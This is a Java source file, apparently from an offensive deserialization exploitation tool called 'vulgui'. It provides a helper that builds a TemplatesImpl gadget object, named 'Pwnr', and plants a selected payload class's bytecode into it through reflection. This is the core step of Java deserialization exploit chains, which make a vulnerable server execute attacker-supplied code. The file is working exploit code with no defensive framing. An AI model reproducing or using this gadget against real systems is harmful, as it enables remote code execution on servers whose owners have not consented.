package vulgui.deser.util;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import vulgui.deser.echo.EchoPayload;

/**
 * @author sunnylast0
 */
public class Gadgetsplugin {
    public static <T> T createTemplatesImpl(String classname) throws Exception {
        Class<T> tplClass = null;

        if ( Boolean.parseBoolean(System.getProperty("properXalan", "false")) ) {
            tplClass = (Class<T>) Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl");
        }else{
            tplClass = (Class<T>) TemplatesImpl.class;
        }

        // 根据不同payload加载不同的CtClass
        Class clazz = EchoPayload.Utils.getPayloadClass(classname);

        final T templates = tplClass.newInstance();
        final byte[] classBytes = ClassFiles.classAsBytes(clazz);

        Reflections.setFieldValue(templates, "_bytecodes", new byte[][] {
                classBytes
        });

        Reflections.setFieldValue(templates, "_name", "Pwnr");
        return templates;
    }
}
